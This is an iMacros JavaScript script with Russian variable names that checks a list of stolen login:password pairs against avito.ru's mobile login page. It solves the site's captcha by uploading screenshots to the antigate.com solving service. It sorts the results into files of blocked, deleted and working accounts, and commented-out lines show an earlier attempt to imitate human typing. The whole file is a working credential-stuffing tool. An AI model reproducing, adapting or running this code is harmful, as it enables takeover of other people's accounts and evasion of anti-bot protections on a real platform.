var capErr = 0;
var start = new Date();
///api key 4 rucaptcha.com: =not needed;
function копиБоди() {
  var x = window.document.getElementsByTagName("body")[0].textContent;
  return x;
}
function timming() {
  diff = (new Date() - start) / 1000;
  return (
    ";\nЗатрачено времени: " +
    Math.floor(diff / 3600) +
    "ч:" +
    (Math.floor(diff / 60) - Math.floor(diff / 3600) * 60) +
    "м:" +
    Math.round(diff % 60) +
    "с"
  );
}
function stata(статусАкка) {
  iimDisplay(
    статусАкка +
      "\n текущий акк № " +
      номерСтроки +
      "\nлогин:пароль = " +
      логин +
      ":" +
      пароль +
      timming()
  );
}
////задаем № тек.аккка;
iimPlayCode(
  "SET !REPLAYSPEED fast\nSET !DATASOURCE C:\\чекер\\номерСтрокиТекущегоАкка.txt\nSET !DATASOURCE_LINE 1\nSET !EXTRACT {{!COL1}}"
);
var номерСтроки = Number(iimGetLastExtract(1));

// функция каунта++ тек строки:
function count() {
  номерСтроки++;
  iimSet("номерСтроки", номерСтроки);
  iimPlayCode(
    `set !REPLAYSPEED fast\n SET !EXTRACT {{номерСтроки}}\nFILEDELETE NAME=C:\\чекер\\номерСтрокиТекущегоАкка.txt\nSAVEAS TYPE=EXTRACT FOLDER=C:\\чекер FILE=номерСтрокиТекущегоАкка.txt`
  );
}

iimPlayCode(
  "SET !REPLAYSPEED fast\nSET !TIMEOUT_STEP 0\nTAB CLOSEALLOTHERS \n TAB OPEN"
);

login: for (i = номерСтроки; i < 1000; i++) {
  //LOGIN;PASS:
  iimSet("номерСтроки", номерСтроки);
  iimPlayCode(
    "SET !REPLAYSPEED fast\nCMDLINE !DATASOURCE C:\\чекер\\акки.txt\nSET !DATASOURCE_LINE {{номерСтроки}}\nset !extract {{!COL1}}\n add !extract {{!COL2}}"
  );
  var логин = iimGetLastExtract(1);
  var пароль = iimGetLastExtract(2);

  iimSet("пароль", пароль);
  iimSet("логин", логин);
  iimPlayCode(`clear\n url goto=https://m.avito.ru/profile
	TAG POS=1 TYPE=INPUT:EMAIL FORM=ACTION:/profile/login ATTR=NAME:login CONTENT={{логин}}
TAG POS=1 TYPE=INPUT:PASSWORD FORM=ACTION:/profile/login ATTR=NAME:password CONTENT={{пароль}}
'==следующие 4 строки юзались для иммитации человеческого ввода::
	'EVENT TYPE=CLICK SELECTOR="HTML>BODY>SECTION>FORM>DIV>DIV:nth-of-type(2)>DIV>INPUT" BUTTON=0
	'EVENTS TYPE=KEYPRESS SELECTOR="HTML>BODY>SECTION>FORM>DIV>DIV:nth-of-type(2)>DIV>INPUT" CHARS="{{логин}}"	
	'EVENT TYPE=KEYPRESS SELECTOR="HTML>BODY>SECTION>FORM>DIV>DIV:nth-of-type(2)>DIV>INPUT" KEY=9
	'EVENTS TYPE=KEYPRESS SELECTOR="HTML>BODY>SECTION>FORM>DIV:nth-of-type(2)>DIV:nth-of-type(2)>DIV>INPUT" CHARS="{{пароль}}"`);
  stata("Распознаем капчу");
  if (
    копиБоди().search(/с картинки/i) != -1 ||
    копиБоди().search(/код/i) != -1
  ) {
    //ищем капчу
    cap6: for (g = 0; g < 10; g++) {
      iimPlayCode(`FILTER TYPE=IMAGES STATUS=OFF
	ONDOWNLOAD FOLDER="C:\\" FILE=cap.jpg WAIT=YES
		TAG POS=1 TYPE=IMG ATTR=SRC:https://m.avito.ru/captcha?* CONTENT=EVENT:SAVE_ELEMENT_SCREENSHOT
		TAB T=2
				URL GOTO=http://antigate.com/imacros.html
				TAG POS=1 TYPE=INPUT:FILE FORM=ACTION:in.php ATTR=NAME:file CONTENT=C:\\cap.jpg
				ONDIALOG POS=1 BUTTON=OK CONTENT=
				TAG POS=1 TYPE=INPUT:SUBMIT FORM=ACTION:in.php ATTR=*
				TAG POS=1 TYPE=* ATTR=TXT:* EXTRACT=TXT
		TAB T=1
				EVENT TYPE=CLICK SELECTOR="#captcha" BUTTON=0
				EVENTS TYPE=KEYPRESS SELECTOR="#captcha" CHARS="{{!EXTRACT}}"`);
      iimPlayCode(
        "TAG POS=1 TYPE=INPUT:SUBMIT FORM=ACTION:/profile/login ATTR=*\n wait seconds=1"
      );
      if (копиБоди().search(/код/i) != -1) {
        capErr++;
        stata("=!!!F**CK!--; монстр ошибся уже " + capErr + " раз!;");
        iimSet("логин", логин);
        iimPlayCode(
          "TAG POS=1 TYPE=INPUT:PASSWORD FORM=ACTION:/profile/login ATTR=NAME:password CONTENT={{логин}}"
        );
        continue cap6;
      } else {
        //переразгадывать;
        var g = 10;
      }
    }
  } else {
    iimPlayCode(
      "TAG POS=1 TYPE=INPUT:SUBMIT FORM=ACTION:/profile/login ATTR=*\n wait seconds=1"
    );
    if (копиБоди().search(/код/i) != -1) {
      stata("неверная капча!!!F**CK!--; ");
      continue login;
    } //переразгадывать;
  }
  if (копиБоди().search(/заблокирован/i) != -1) {
    //акк заблочен;
    stata("АКК ЗАБЛОЧЕН!");
    iimSet("логин", логин);
    iimSet("пароль", пароль);
    iimPlayCode(
      "SET !EXTRACT {{логин}}:{{пароль}}\nSAVEAS TYPE=EXTRACT FOLDER=C:\\чекер FILE=заблоченные.txt"
    );
    count();
  } else {
    if (
      копиБоди().search(/Неверная электронная/i) != -1 ||
      копиБоди().search(/ваш пароль/i) != -1
    ) {
      //акк удален;
      stata("АКК УДАЛЕН");
      iimSet("логин", логин);
      iimSet("пароль", пароль);
      iimPlayCode(
        "SET !EXTRACT {{логин}}:{{пароль}}\nSAVEAS TYPE=EXTRACT FOLDER=C:\\чекер FILE=удаленные.txt"
      );
      count();
    } else {
      if (копиБоди().search(/Сообщения/i) != -1) {
        stata("++++норм акк++++"); //норм акк;
        iimSet("логин", логин);
        iimSet("пароль", пароль);
        iimPlayCode(
          "SET !EXTRACT {{логин}}:{{пароль}}\nSAVEAS TYPE=EXTRACT FOLDER=C:\\чекер FILE=норм.txt"
        );
        count();
      } else {
        alert("=%УЙ ЗНАЕТ!!!!!!!;");
      }
    }
  }
}